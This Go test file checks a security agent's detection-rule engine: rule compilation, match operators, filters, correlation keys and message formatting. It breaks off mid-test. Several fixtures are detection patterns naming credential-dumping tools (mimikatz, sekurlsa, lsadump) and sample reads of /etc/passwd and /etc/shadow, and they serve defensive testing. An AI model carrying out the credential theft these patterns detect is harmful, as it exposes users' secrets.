package engine

import (
	"os"
	"path/filepath"
	"regexp"
	"testing"
	"time"

	"github.com/sentinel-agent/sentinel/internal/types"
	"gopkg.in/yaml.v3"
)

// ---------------------------------------------------------------------------
// Helper: build a minimal LogEvent with the given Fields map.
// ---------------------------------------------------------------------------

func makeEvent(fields map[string]string) types.LogEvent {
	return types.LogEvent{
		Timestamp: time.Now(),
		Fields:    fields,
	}
}

// ===========================================================================
// 1. CompileRule
// ===========================================================================

func TestCompileRule_Basic(t *testing.T) {
	rule := Rule{
		ID:          "rule-001",
		Title:       "Test Rule",
		Description: "A basic test rule",
		Severity:    "high",
		Status:      "active",
		Author:      "tester",
		Tags:        []string{"test", "alpha"},
		LogSource: RuleLogSource{
			Category: "auth",
			Product:  "linux",
			Service:  "sshd",
		},
		Detection: RuleDetection{
			Selection: map[string]interface{}{
				"username": "root",
			},
			Condition: "selection",
		},
	}

	compiled, err := CompileRule(rule)
	if err != nil {
		t.Fatalf("CompileRule returned error: %v", err)
	}

	if compiled.ID != "rule-001" {
		t.Errorf("ID: got %q, want %q", compiled.ID, "rule-001")
	}
	if compiled.Title != "Test Rule" {
		t.Errorf("Title: got %q, want %q", compiled.Title, "Test Rule")
	}
	if compiled.Description != "A basic test rule" {
		t.Errorf("Description: got %q, want %q", compiled.Description, "A basic test rule")
	}
	if compiled.Severity != types.SeverityHigh {
		t.Errorf("Severity: got %v, want %v", compiled.Severity, types.SeverityHigh)
	}
	if !compiled.Enabled {
		t.Error("Enabled: expected true for status=active")
	}
	if len(compiled.Tags) != 2 || compiled.Tags[0] != "test" || compiled.Tags[1] != "alpha" {
		t.Errorf("Tags: got %v, want [test alpha]", compiled.Tags)
	}
	if compiled.LogSource.Category != "auth" {
		t.Errorf("LogSource.Category: got %q, want %q", compiled.LogSource.Category, "auth")
	}
	if compiled.MessageTpl != "[high] Test Rule" {
		t.Errorf("MessageTpl: got %q, want %q", compiled.MessageTpl, "[high] Test Rule")
	}
	if len(compiled.Conditions) != 1 {
		t.Fatalf("Conditions count: got %d, want 1", len(compiled.Conditions))
	}
	cond := compiled.Conditions[0]
	if cond.Field != "username" || cond.Value != "root" || cond.Operator != OpEquals {
		t.Errorf("Condition: got {Field:%q Value:%q Op:%d}, want {Field:username Value:root Op:OpEquals}", cond.Field, cond.Value, cond.Operator)
	}
}

func TestCompileRule_SeverityMapping(t *testing.T) {
	tests := []struct {
		severity string
		want     types.Severity
	}{
		{"info", types.SeverityInfo},
		{"low", types.SeverityLow},
		{"medium", types.SeverityMedium},
		{"high", types.SeverityHigh},
		{"critical", types.SeverityCritical},
		{"unknown_garbage", types.SeverityInfo}, // default
		{"", types.SeverityInfo},                // empty
	}

	for _, tc := range tests {
		rule := Rule{
			ID:       "sev-test",
			Severity: tc.severity,
			Detection: RuleDetection{
				Selection: map[string]interface{}{},
			},
		}
		compiled, err := CompileRule(rule)
		if err != nil {
			t.Fatalf("CompileRule(%q) error: %v", tc.severity, err)
		}
		if compiled.Severity != tc.want {
			t.Errorf("Severity %q: got %v, want %v", tc.severity, compiled.Severity, tc.want)
		}
	}
}

func TestCompileRule_DisabledStatus(t *testing.T) {
	rule := Rule{
		ID:     "disabled-rule",
		Status: "disabled",
		Detection: RuleDetection{
			Selection: map[string]interface{}{},
		},
	}
	compiled, err := CompileRule(rule)
	if err != nil {
		t.Fatalf("CompileRule error: %v", err)
	}
	if compiled.Enabled {
		t.Error("Enabled: expected false for status=disabled")
	}
}

func TestCompileRule_EnabledForVariousStatuses(t *testing.T) {
	for _, status := range []string{"active", "test", "", "experimental"} {
		rule := Rule{
			ID:     "status-test",
			Status: status,
			Detection: RuleDetection{
				Selection: map[string]interface{}{},
			},
		}
		compiled, err := CompileRule(rule)
		if err != nil {
			t.Fatalf("CompileRule status=%q error: %v", status, err)
		}
		if !compiled.Enabled {
			t.Errorf("Enabled: expected true for status=%q", status)
		}
	}
}

func TestCompileRule_ContainsModifier(t *testing.T) {
	rule := Rule{
		ID: "mod-contains",
		Detection: RuleDetection{
			Selection: map[string]interface{}{
				"command_line|contains": "mimikatz",
			},
		},
	}
	compiled, err := CompileRule(rule)
	if err != nil {
		t.Fatalf("CompileRule error: %v", err)
	}
	if len(compiled.Conditions) != 1 {
		t.Fatalf("Conditions count: got %d, want 1", len(compiled.Conditions))
	}
	c := compiled.Conditions[0]
	if c.Field != "command_line" {
		t.Errorf("Field: got %q, want %q", c.Field, "command_line")
	}
	if c.Operator != OpContains {
		t.Errorf("Operator: got %d, want OpContains (%d)", c.Operator, OpContains)
	}
	if c.Value != "mimikatz" {
		t.Errorf("Value: got %q, want %q", c.Value, "mimikatz")
	}
}

func TestCompileRule_StartsWithModifier(t *testing.T) {
	rule := Rule{
		ID: "mod-startswith",
		Detection: RuleDetection{
			Selection: map[string]interface{}{
				"path|startswith": "/etc/",
			},
		},
	}
	compiled, err := CompileRule(rule)
	if err != nil {
		t.Fatalf("CompileRule error: %v", err)
	}
	c := compiled.Conditions[0]
	if c.Field != "path" || c.Operator != OpStartsWith || c.Value != "/etc/" {
		t.Errorf("Condition: got {Field:%q Op:%d Value:%q}, want {path OpStartsWith /etc/}", c.Field, c.Operator, c.Value)
	}
}

func TestCompileRule_EndsWithModifier(t *testing.T) {
	rule := Rule{
		ID: "mod-endswith",
		Detection: RuleDetection{
			Selection: map[string]interface{}{
				"filename|endswith": ".exe",
			},
		},
	}
	compiled, err := CompileRule(rule)
	if err != nil {
		t.Fatalf("CompileRule error: %v", err)
	}
	c := compiled.Conditions[0]
	if c.Field != "filename" || c.Operator != OpEndsWith || c.Value != ".exe" {
		t.Errorf("Condition: got {Field:%q Op:%d Value:%q}, want {filename OpEndsWith .exe}", c.Field, c.Operator, c.Value)
	}
}

func TestCompileRule_RegexModifier(t *testing.T) {
	rule := Rule{
		ID: "mod-regex",
		Detection: RuleDetection{
			Selection: map[string]interface{}{
				"url|re": `^/api/v[0-9]+/admin`,
			},
		},
	}
	compiled, err := CompileRule(rule)
	if err != nil {
		t.Fatalf("CompileRule error: %v", err)
	}
	c := compiled.Conditions[0]
	if c.Field != "url" || c.Operator != OpRegex {
		t.Errorf("Condition: got {Field:%q Op:%d}, want {url OpRegex}", c.Field, c.Operator)
	}
	if c.Regex == nil {
		t.Fatal("Regex should be compiled, got nil")
	}
	if !c.Regex.MatchString("/api/v2/admin") {
		t.Error("Compiled regex should match /api/v2/admin")
	}
}

func TestCompileRule_InvalidModifier(t *testing.T) {
	rule := Rule{
		ID: "bad-modifier",
		Detection: RuleDetection{
			Selection: map[string]interface{}{
				"field|badmod": "value",
			},
		},
	}
	_, err := CompileRule(rule)
	if err == nil {
		t.Fatal("expected error for unknown modifier, got nil")
	}
}

func TestCompileRule_InvalidRegex(t *testing.T) {
	rule := Rule{
		ID: "bad-regex",
		Detection: RuleDetection{
			Selection: map[string]interface{}{
				"field|re": "[invalid(regex",
			},
		},
	}
	_, err := CompileRule(rule)
	if err == nil {
		t.Fatal("expected error for invalid regex, got nil")
	}
}

func TestCompileRule_ListValueBecomesOpIn(t *testing.T) {
	rule := Rule{
		ID: "list-in",
		Detection: RuleDetection{
			Selection: map[string]interface{}{
				"action": []interface{}{"allow", "deny", "drop"},
			},
		},
	}
	compiled, err := CompileRule(rule)
	if err != nil {
		t.Fatalf("CompileRule error: %v", err)
	}
	c := compiled.Conditions[0]
	if c.Operator != OpIn {
		t.Errorf("Operator: got %d, want OpIn (%d)", c.Operator, OpIn)
	}
	if len(c.Values) != 3 {
		t.Fatalf("Values count: got %d, want 3", len(c.Values))
	}
	expected := []string{"allow", "deny", "drop"}
	for i, v := range expected {
		if c.Values[i] != v {
			t.Errorf("Values[%d]: got %q, want %q", i, c.Values[i], v)
		}
	}
}

func TestCompileRule_ContainsWithList(t *testing.T) {
	rule := Rule{
		ID: "contains-list",
		Detection: RuleDetection{
			Selection: map[string]interface{}{
				"command_line|contains": []interface{}{"mimikatz", "sekurlsa", "lsadump"},
			},
		},
	}
	compiled, err := CompileRule(rule)
	if err != nil {
		t.Fatalf("CompileRule error: %v", err)
	}
	c := compiled.Conditions[0]
	// With a list on a modifier, the operator stays OpContains but Values is populated.
	if c.Operator != OpContains {
		t.Errorf("Operator: got %d, want OpContains (%d)", c.Operator, OpContains)
	}
	if len(c.Values) != 3 {
		t.Fatalf("Values count: got %d, want 3", len(c.Values))
	}
}

func TestCompileRule_BoolTrueBecomesOpExists(t *testing.T) {
	rule := Rule{
		ID: "exists-bool",
		Detection: RuleDetection{
			Selection: map[string]interface{}{
				"source_ip": true,
			},
		},
	}
	compiled, err := CompileRule(rule)
	if err != nil {
		t.Fatalf("CompileRule error: %v", err)
	}
	c := compiled.Conditions[0]
	if c.Operator != OpExists {
		t.Errorf("Operator: got %d, want OpExists (%d)", c.Operator, OpExists)
	}
}

func TestCompileRule_FiltersCompiled(t *testing.T) {
	rule := Rule{
		ID: "with-filter",
		Detection: RuleDetection{
			Selection: map[string]interface{}{
				"action": "login",
			},
			Filter: map[string]interface{}{
				"username":           "service_account",
				"source_ip|contains": "10.0.",
			},
			Condition: "selection and not filter",
		},
	}
	compiled, err := CompileRule(rule)
	if err != nil {
		t.Fatalf("CompileRule error: %v", err)
	}
	if len(compiled.Conditions) != 1 {
		t.Errorf("Conditions count: got %d, want 1", len(compiled.Conditions))
	}
	if len(compiled.Filters) != 2 {
		t.Errorf("Filters count: got %d, want 2", len(compiled.Filters))
	}
}

func TestCompileRule_CorrelationPreserved(t *testing.T) {
	rule := Rule{
		ID: "corr-rule",
		Detection: RuleDetection{
			Selection: map[string]interface{}{},
		},
		Correlation: &RuleCorrelation{
			GroupBy:   []string{"source_ip", "username"},
			Threshold: 5,
			Window:    10 * time.Minute,
		},
	}
	compiled, err := CompileRule(rule)
	if err != nil {
		t.Fatalf("CompileRule error: %v", err)
	}
	if compiled.Correlation == nil {
		t.Fatal("Correlation should not be nil")
	}
	if compiled.Correlation.Threshold != 5 {
		t.Errorf("Threshold: got %d, want 5", compiled.Correlation.Threshold)
	}
	if compiled.Correlation.Window != 10*time.Minute {
		t.Errorf("Window: got %v, want 10m", compiled.Correlation.Window)
	}
}

func TestCompileRule_ActionsPreserved(t *testing.T) {
	rule := Rule{
		ID: "action-rule",
		Detection: RuleDetection{
			Selection: map[string]interface{}{},
		},
		Response: []RuleAction{
			{Type: types.ActionBlockIP, TargetField: "source_ip"},
			{Type: types.ActionDisableUser, TargetField: "username"},
		},
	}
	compiled, err := CompileRule(rule)
	if err != nil {
		t.Fatalf("CompileRule error: %v", err)
	}
	if len(compiled.Actions) != 2 {
		t.Fatalf("Actions count: got %d, want 2", len(compiled.Actions))
	}
	if compiled.Actions[0].Type != types.ActionBlockIP {
		t.Errorf("Action[0].Type: got %q, want %q", compiled.Actions[0].Type, types.ActionBlockIP)
	}
	if compiled.Actions[1].TargetField != "username" {
		t.Errorf("Action[1].TargetField: got %q, want %q", compiled.Actions[1].TargetField, "username")
	}
}

func TestCompileRule_InvalidFilterModifier(t *testing.T) {
	rule := Rule{
		ID: "bad-filter-mod",
		Detection: RuleDetection{
			Selection: map[string]interface{}{
				"action": "login",
			},
			Filter: map[string]interface{}{
				"field|nope": "value",
			},
		},
	}
	_, err := CompileRule(rule)
	if err == nil {
		t.Fatal("expected error for unknown filter modifier, got nil")
	}
}

// ===========================================================================
// 2. CompiledRule.Matches
// ===========================================================================

func TestMatches_BasicMatch(t *testing.T) {
	cr := &CompiledRule{
		Conditions: []Condition{
			{Field: "action", Operator: OpEquals, Value: "login"},
		},
	}
	event := makeEvent(map[string]string{"action": "login"})
	if !cr.Matches(event) {
		t.Error("expected match for action=login")
	}
}

func TestMatches_NoMatch(t *testing.T) {
	cr := &CompiledRule{
		Conditions: []Condition{
			{Field: "action", Operator: OpEquals, Value: "login"},
		},
	}
	event := makeEvent(map[string]string{"action": "logout"})
	if cr.Matches(event) {
		t.Error("expected no match for action=logout")
	}
}

func TestMatches_CategoryFilter(t *testing.T) {
	cr := &CompiledRule{
		LogSource: RuleLogSource{Category: "auth"},
		Conditions: []Condition{
			{Field: "action", Operator: OpEquals, Value: "login"},
		},
	}

	eventMatch := types.LogEvent{
		Category: "auth",
		Fields:   map[string]string{"action": "login"},
	}
	if !cr.Matches(eventMatch) {
		t.Error("expected match when category matches")
	}

	eventNoMatch := types.LogEvent{
		Category: "network",
		Fields:   map[string]string{"action": "login"},
	}
	if cr.Matches(eventNoMatch) {
		t.Error("expected no match when category differs")
	}
}

func TestMatches_ProductFilter(t *testing.T) {
	cr := &CompiledRule{
		LogSource: RuleLogSource{Product: "linux"},
		Conditions: []Condition{
			{Field: "action", Operator: OpEquals, Value: "login"},
		},
	}

	eventMatch := types.LogEvent{
		Platform: "linux",
		Fields:   map[string]string{"action": "login"},
	}
	if !cr.Matches(eventMatch) {
		t.Error("expected match when product=platform matches")
	}

	eventNoMatch := types.LogEvent{
		Platform: "windows",
		Fields:   map[string]string{"action": "login"},
	}
	if cr.Matches(eventNoMatch) {
		t.Error("expected no match when product!=platform")
	}
}

func TestMatches_AllConditionsMustMatch(t *testing.T) {
	cr := &CompiledRule{
		Conditions: []Condition{
			{Field: "action", Operator: OpEquals, Value: "login"},
			{Field: "status", Operator: OpEquals, Value: "failed"},
		},
	}

	both := makeEvent(map[string]string{"action": "login", "status": "failed"})
	if !cr.Matches(both) {
		t.Error("expected match when all conditions met")
	}

	onlyOne := makeEvent(map[string]string{"action": "login", "status": "success"})
	if cr.Matches(onlyOne) {
		t.Error("expected no match when only one condition met")
	}
}

func TestMatches_FilterExcludes(t *testing.T) {
	cr := &CompiledRule{
		Conditions: []Condition{
			{Field: "action", Operator: OpEquals, Value: "login"},
		},
		Filters: []Condition{
			{Field: "username", Operator: OpEquals, Value: "service_account"},
		},
	}

	excluded := makeEvent(map[string]string{"action": "login", "username": "service_account"})
	if cr.Matches(excluded) {
		t.Error("expected filter to exclude event")
	}

	notExcluded := makeEvent(map[string]string{"action": "login", "username": "admin"})
	if !cr.Matches(notExcluded) {
		t.Error("expected match when filter does not apply")
	}
}

func TestMatches_NoConditions(t *testing.T) {
	cr := &CompiledRule{
		Conditions: []Condition{},
	}
	event := makeEvent(map[string]string{"anything": "whatever"})
	if !cr.Matches(event) {
		t.Error("expected match when there are no conditions")
	}
}

func TestMatches_EmptyCategoryAndProduct(t *testing.T) {
	cr := &CompiledRule{
		LogSource:  RuleLogSource{},
		Conditions: []Condition{},
	}
	event := types.LogEvent{
		Category: "anything",
		Platform: "anything",
		Fields:   map[string]string{},
	}
	if !cr.Matches(event) {
		t.Error("expected match when LogSource is empty (no filtering)")
	}
}

func TestMatches_MultipleFiltersOnlyOneNeededToExclude(t *testing.T) {
	cr := &CompiledRule{
		Conditions: []Condition{
			{Field: "action", Operator: OpEquals, Value: "login"},
		},
		Filters: []Condition{
			{Field: "username", Operator: OpEquals, Value: "svc"},
			{Field: "source_ip", Operator: OpEquals, Value: "127.0.0.1"},
		},
	}

	// Only the second filter matches but that is enough to exclude.
	event := makeEvent(map[string]string{
		"action":    "login",
		"username":  "admin",
		"source_ip": "127.0.0.1",
	})
	if cr.Matches(event) {
		t.Error("expected exclusion when any single filter matches")
	}
}

// ===========================================================================
// 3. Condition.Evaluate
// ===========================================================================

// --- OpEquals ---

func TestEvaluate_OpEquals_ExactMatch(t *testing.T) {
	c := Condition{Field: "action", Operator: OpEquals, Value: "login"}
	event := makeEvent(map[string]string{"action": "login"})
	if !c.Evaluate(event) {
		t.Error("OpEquals: expected true for exact match")
	}
}

func TestEvaluate_OpEquals_CaseInsensitive(t *testing.T) {
	c := Condition{Field: "action", Operator: OpEquals, Value: "LOGIN"}
	event := makeEvent(map[string]string{"action": "login"})
	if !c.Evaluate(event) {
		t.Error("OpEquals: expected case-insensitive match")
	}
}

func TestEvaluate_OpEquals_NoMatch(t *testing.T) {
	c := Condition{Field: "action", Operator: OpEquals, Value: "login"}
	event := makeEvent(map[string]string{"action": "logout"})
	if c.Evaluate(event) {
		t.Error("OpEquals: expected false for non-match")
	}
}

// --- OpContains ---

func TestEvaluate_OpContains_Substring(t *testing.T) {
	c := Condition{Field: "command_line", Operator: OpContains, Value: "mimikatz"}
	event := makeEvent(map[string]string{"command_line": "C:\\tools\\mimikatz.exe --dump"})
	if !c.Evaluate(event) {
		t.Error("OpContains: expected true for substring match")
	}
}

func TestEvaluate_OpContains_CaseInsensitive(t *testing.T) {
	c := Condition{Field: "command_line", Operator: OpContains, Value: "MIMIKATZ"}
	event := makeEvent(map[string]string{"command_line": "run mimikatz now"})
	if !c.Evaluate(event) {
		t.Error("OpContains: expected case-insensitive match")
	}
}

func TestEvaluate_OpContains_NoMatch(t *testing.T) {
	c := Condition{Field: "command_line", Operator: OpContains, Value: "mimikatz"}
	event := makeEvent(map[string]string{"command_line": "notepad.exe"})
	if c.Evaluate(event) {
		t.Error("OpContains: expected false for no substring")
	}
}

func TestEvaluate_OpContains_ListOR(t *testing.T) {
	c := Condition{
		Field:    "command_line",
		Operator: OpContains,
		Values:   []string{"mimikatz", "sekurlsa", "lsadump"},
	}
	// One of the values is present.
	event := makeEvent(map[string]string{"command_line": "invoke-sekurlsa"})
	if !c.Evaluate(event) {
		t.Error("OpContains list-OR: expected true when one value matches")
	}

	// None match.
	eventNone := makeEvent(map[string]string{"command_line": "notepad"})
	if c.Evaluate(eventNone) {
		t.Error("OpContains list-OR: expected false when no values match")
	}
}

// --- OpStartsWith ---

func TestEvaluate_OpStartsWith_Match(t *testing.T) {
	c := Condition{Field: "path", Operator: OpStartsWith, Value: "/etc/"}
	event := makeEvent(map[string]string{"path": "/etc/passwd"})
	if !c.Evaluate(event) {
		t.Error("OpStartsWith: expected true for prefix match")
	}
}

func TestEvaluate_OpStartsWith_CaseInsensitive(t *testing.T) {
	c := Condition{Field: "path", Operator: OpStartsWith, Value: "/ETC/"}
	event := makeEvent(map[string]string{"path": "/etc/shadow"})
	if !c.Evaluate(event) {
		t.Error("OpStartsWith: expected case-insensitive match")
	}
}

func TestEvaluate_OpStartsWith_NoMatch(t *testing.T) {
	c := Condition{Field: "path", Operator: OpStartsWith, Value: "/etc/"}
	event := makeEvent(map[string]string{"path": "/var/log/syslog"})
	if c.Evaluate(event) {
		t.Error("OpStartsWith: expected false for non-prefix")
	}
}

func TestEvaluate_OpStartsWith_ListOR(t *testing.T) {
	c := Condition{
		Field:    "path",
		Operator: OpStartsWith,
		Values:   []string{"/etc/", "/var/", "/tmp/"},
	}
	event := makeEvent(map[string]string{"path": "/var/log/auth.log"})
	if !c.Evaluate(event) {
		t.Error("OpStartsWith list-OR: expected true when one prefix matches")
	}

	eventNone := makeEvent(map[string]string{"path": "/home/user"})
	if c.Evaluate(eventNone) {
		t.Error("OpStartsWith list-OR: expected false when no prefix matches")
	}
}

// --- OpEndsWith ---

func TestEvaluate_OpEndsWith_Match(t *testing.T) {
	c := Condition{Field: "filename", Operator: OpEndsWith, Value: ".exe"}
	event := makeEvent(map[string]string{"filename": "malware.exe"})
	if !c.Evaluate(event) {
		t.Error("OpEndsWith: expected true for suffix match")
	}
}

func TestEvaluate_OpEndsWith_CaseInsensitive(t *testing.T) {
	c := Condition{Field: "filename", Operator: OpEndsWith, Value: ".EXE"}
	event := makeEvent(map[string]string{"filename": "malware.exe"})
	if !c.Evaluate(event) {
		t.Error("OpEndsWith: expected case-insensitive match")
	}
}

func TestEvaluate_OpEndsWith_NoMatch(t *testing.T) {
	c := Condition{Field: "filename", Operator: OpEndsWith, Value: ".exe"}
	event := makeEvent(map[string]string{"filename": "script.sh"})
	if c.Evaluate(event) {
		t.Error("OpEndsWith: expected false for non-suffix")
	}
}

func TestEvaluate_OpEndsWith_ListOR(t *testing.T) {
	c := Condition{
		Field:    "filename",
		Operator: OpEndsWith,
		Values:   []string{".exe", ".dll", ".bat"},
	}
	event := makeEvent(map[string]string{"filename": "run.bat"})
	if !c.Evaluate(event) {
		t.Error("OpEndsWith list-OR: expected true when one suffix matches")
	}

	eventNone := makeEvent(map[string]string{"filename": "readme.txt"})
	if c.Evaluate(eventNone) {
		t.Error("OpEndsWith list-OR: expected false when no suffix matches")
	}
}

// --- OpRegex ---

func TestEvaluate_OpRegex_Match(t *testing.T) {
	c := Condition{
		Field:    "url",
		Operator: OpRegex,
		Regex:    regexp.MustCompile(`^/api/v[0-9]+/admin`),
	}
	event := makeEvent(map[string]string{"url": "/api/v2/admin/users"})
	if !c.Evaluate(event) {
		t.Error("OpRegex: expected true for matching pattern")
	}
}

func TestEvaluate_OpRegex_NoMatch(t *testing.T) {
	c := Condition{
		Field:    "url",
		Operator: OpRegex,
		Regex:    regexp.MustCompile(`^/api/v[0-9]+/admin`),
	}
	event := makeEvent(map[string]string{"url": "/api/v2/users"})
	if c.Evaluate(event) {
		t.Error("OpRegex: expected false for non-matching pattern")
	}
}

func TestEvaluate_OpRegex_NilRegex(t *testing.T) {
	c := Condition{
		Field:    "url",
		Operator: OpRegex,
		Regex:    nil,
	}
	event := makeEvent(map[string]string{"url": "/anything"})
	if c.Evaluate(event) {
		t.Error("OpRegex: expected false when Regex is nil")
	}
}

// --- OpIn ---

func TestEvaluate_OpIn_Match(t *testing.T) {
	c := Condition{
		Field:    "action",
		Operator: OpIn,
		Values:   []string{"allow", "deny", "drop"},
	}
	event := makeEvent(map[string]string{"action": "deny"})
	if !c.Evaluate(event) {
		t.Error("OpIn: expected true when field value is in list")
	}
}

func TestEvaluate_OpIn_CaseInsensitive(t *testing.T) {
	c := Condition{
		Field:    "action",
		Operator: OpIn,
		Values:   []string{"allow", "deny", "drop"},
	}
	event := makeEvent(map[string]string{"action": "DENY"})
	if !c.Evaluate(event) {
		t.Error("OpIn: expected case-insensitive match")
	}
}

func TestEvaluate_OpIn_NoMatch(t *testing.T) {
	c := Condition{
		Field:    "action",
		Operator: OpIn,
		Values:   []string{"allow", "deny", "drop"},
	}
	event := makeEvent(map[string]string{"action": "forward"})
	if c.Evaluate(event) {
		t.Error("OpIn: expected false when field value not in list")
	}
}

// --- OpExists ---

func TestEvaluate_OpExists_FieldPresent(t *testing.T) {
	c := Condition{Field: "source_ip", Operator: OpExists}
	event := makeEvent(map[string]string{"source_ip": "10.0.0.1"})
	if !c.Evaluate(event) {
		t.Error("OpExists: expected true when field exists")
	}
}

func TestEvaluate_OpExists_FieldAbsent(t *testing.T) {
	c := Condition{Field: "source_ip", Operator: OpExists}
	event := makeEvent(map[string]string{"other_field": "value"})
	if c.Evaluate(event) {
		t.Error("OpExists: expected false when field is missing")
	}
}

func TestEvaluate_OpExists_EmptyValue(t *testing.T) {
	// Key exists but value is empty -- still "exists" since the key is in the map.
	c := Condition{Field: "source_ip", Operator: OpExists}
	event := makeEvent(map[string]string{"source_ip": ""})
	if !c.Evaluate(event) {
		t.Error("OpExists: expected true when field exists even with empty value")
	}
}

// --- Special fields ---

func TestEvaluate_SpecialField_Raw(t *testing.T) {
	c := Condition{Field: "raw", Operator: OpContains, Value: "error"}
	event := types.LogEvent{
		Raw:    "kernel: segfault error at 0x0",
		Fields: map[string]string{},
	}
	if !c.Evaluate(event) {
		t.Error("Special field 'raw': expected match on event.Raw")
	}
}

func TestEvaluate_SpecialField_Message(t *testing.T) {
	c := Condition{Field: "message", Operator: OpContains, Value: "segfault"}
	event := types.LogEvent{
		Raw:    "kernel: segfault error at 0x0",
		Fields: map[string]string{},
	}
	if !c.Evaluate(event) {
		t.Error("Special field 'message': expected match on event.Raw")
	}
}

func TestEvaluate_SpecialField_Source(t *testing.T) {
	c := Condition{Field: "source", Operator: OpEquals, Value: "syslog"}
	event := types.LogEvent{
		Source: "syslog",
		Fields: map[string]string{},
	}
	if !c.Evaluate(event) {
		t.Error("Special field 'source': expected match on event.Source")
	}
}

func TestEvaluate_SpecialField_Category(t *testing.T) {
	c := Condition{Field: "category", Operator: OpEquals, Value: "auth"}
	event := types.LogEvent{
		Category: "auth",
		Fields:   map[string]string{},
	}
	if !c.Evaluate(event) {
		t.Error("Special field 'category': expected match on event.Category")
	}
}

func TestEvaluate_SpecialField_Hostname(t *testing.T) {
	c := Condition{Field: "hostname", Operator: OpEquals, Value: "web-01"}
	event := types.LogEvent{
		Hostname: "web-01",
		Fields:   map[string]string{},
	}
	if !c.Evaluate(event) {
		t.Error("Special field 'hostname': expected match on event.Hostname")
	}
}

func TestEvaluate_SpecialField_Platform(t *testing.T) {
	c := Condition{Field: "platform", Operator: OpEquals, Value: "linux"}
	event := types.LogEvent{
		Platform: "linux",
		Fields:   map[string]string{},
	}
	if !c.Evaluate(event) {
		t.Error("Special field 'platform': expected match on event.Platform")
	}
}

// --- Missing field ---

func TestEvaluate_MissingField_ReturnsFalse(t *testing.T) {
	c := Condition{Field: "nonexistent", Operator: OpEquals, Value: "anything"}
	event := makeEvent(map[string]string{"other": "val"})
	if c.Evaluate(event) {
		t.Error("Missing field: expected false for all non-OpExists operators")
	}
}

func TestEvaluate_MissingField_Contains(t *testing.T) {
	c := Condition{Field: "nonexistent", Operator: OpContains, Value: "x"}
	event := makeEvent(map[string]string{})
	if c.Evaluate(event) {
		t.Error("Missing field: OpContains should return false")
	}
}

func TestEvaluate_MissingField_StartsWith(t *testing.T) {
	c := Condition{Field: "nonexistent", Operator: OpStartsWith, Value: "x"}
	event := makeEvent(map[string]string{})
	if c.Evaluate(event) {
		t.Error("Missing field: OpStartsWith should return false")
	}
}

func TestEvaluate_MissingField_EndsWith(t *testing.T) {
	c := Condition{Field: "nonexistent", Operator: OpEndsWith, Value: "x"}
	event := makeEvent(map[string]string{})
	if c.Evaluate(event) {
		t.Error("Missing field: OpEndsWith should return false")
	}
}

func TestEvaluate_MissingField_Regex(t *testing.T) {
	c := Condition{Field: "nonexistent", Operator: OpRegex, Regex: regexp.MustCompile(".*")}
	event := makeEvent(map[string]string{})
	if c.Evaluate(event) {
		t.Error("Missing field: OpRegex should return false")
	}
}

func TestEvaluate_MissingField_In(t *testing.T) {
	c := Condition{Field: "nonexistent", Operator: OpIn, Values: []string{"a"}}
	event := makeEvent(map[string]string{})
	if c.Evaluate(event) {
		t.Error("Missing field: OpIn should return false")
	}
}

// --- LookupField dot-to-underscore fallback ---

func TestEvaluate_DotFieldLookup(t *testing.T) {
	c := Condition{Field: "process.name", Operator: OpEquals, Value: "sshd"}
	// The LookupField function tries dots, then replaces dots with underscores.
	event := makeEvent(map[string]string{"process_name": "sshd"})
	if !c.Evaluate(event) {
		t.Error("Dot field: expected LookupField to fall back to process_name")
	}
}

func TestEvaluate_UnderscoreFieldLookup(t *testing.T) {
	c := Condition{Field: "process_name", Operator: OpEquals, Value: "sshd"}
	// LookupField also tries replacing underscores with dots.
	event := makeEvent(map[string]string{"process.name": "sshd"})
	if !c.Evaluate(event) {
		t.Error("Underscore field: expected LookupField to fall back to process.name")
	}
}

// ===========================================================================
// 4. CorrelationKey
// ===========================================================================

func TestCorrelationKey_NilCorrelation(t *testing.T) {
	cr := &CompiledRule{Correlation: nil}
	event := makeEvent(map[string]string{"source_ip": "1.2.3.4"})
	if key := cr.CorrelationKey(event); key != "" {
		t.Errorf("CorrelationKey with nil correlation: got %q, want empty", key)
	}
}

func TestCorrelationKey_SingleGroupBy(t *testing.T) {
	cr := &CompiledRule{
		Correlation: &RuleCorrelation{
			GroupBy: []string{"source_ip"},
		},
	}
	event := makeEvent(map[string]string{"source_ip": "10.0.0.1"})
	key := cr.CorrelationKey(event)
	if key != "10.0.0.1" {
		t.Errorf("CorrelationKey: got %q, want %q", key, "10.0.0.1")
	}
}

func TestCorrelationKey_MultipleGroupBy(t *testing.T) {
	cr := &CompiledRule{
		Correlation: &RuleCorrelation{
			GroupBy: []string{"source_ip", "username"},
		},
	}
	event := makeEvent(map[string]string{
		"source_ip": "10.0.0.1",
		"username":  "admin",
	})
	key := cr.CorrelationKey(event)
	if key != "10.0.0.1:admin" {
		t.Errorf("CorrelationKey: got %q, want %q", key, "10.0.0.1:admin")
	}
}

func TestCorrelationKey_MissingGroupByField(t *testing.T) {
	cr := &CompiledRule{
		Correlation: &RuleCorrelation{
			GroupBy: []string{"source_ip", "username"},
		},
	}
	// Only source_ip is present; username is missing.
	event := makeEvent(map[string]string{"source_ip": "10.0.0.1"})
	key := cr.CorrelationKey(event)
	// Only the existing field contributes; missing fields are skipped.
	if key != "10.0.0.1" {
		t.Errorf("CorrelationKey missing field: got %q, want %q", key, "10.0.0.1")
	}
}

func TestCorrelationKey_AllFieldsMissing(t *testing.T) {
	cr := &CompiledRule{
		Correlation: &RuleCorrelation{
			GroupBy: []string{"source_ip", "username"},
		},
	}
	event := makeEvent(map[string]string{"other": "value"})
	key := cr.CorrelationKey(event)
	if key != "" {
		t.Errorf("CorrelationKey all missing: got %q, want empty", key)
	}
}

func TestCorrelationKey_EmptyGroupBy(t *testing.T) {
	cr := &CompiledRule{
		Correlation: &RuleCorrelation{
			GroupBy: []string{},
		},
	}
	event := makeEvent(map[string]string{"source_ip": "10.0.0.1"})
	key := cr.CorrelationKey(event)
	if key != "" {
		t.Errorf("CorrelationKey empty GroupBy: got %q, want empty", key)
	}
}

// ===========================================================================
// 5. FormatMessage
// ===========================================================================

func TestFormatMessage_BaseOnly(t *testing.T) {
	cr := &CompiledRule{
		Title:    "Brute Force Detected",
		Severity: types.SeverityHigh,
	}
	event := makeEvent(map[string]string{})
	msg := cr.FormatMessage(event)
	expected := "[high] Brute Force Detected"
	if msg != expected {
		t.Errorf("FormatMessage base: got %q, want %q", msg, expected)
	}
}

func TestFormatMessage_WithSourceIP(t *testing.T) {
	cr := &CompiledRule{
		Title:    "Brute Force Detected",
		Severity: types.SeverityHigh,
	}
	event := makeEvent(map[string]string{"source_ip": "10.0.0.5"})
	msg := cr.FormatMessage(event)
	expected := "[high] Brute Force Detected from 10.0.0.5"
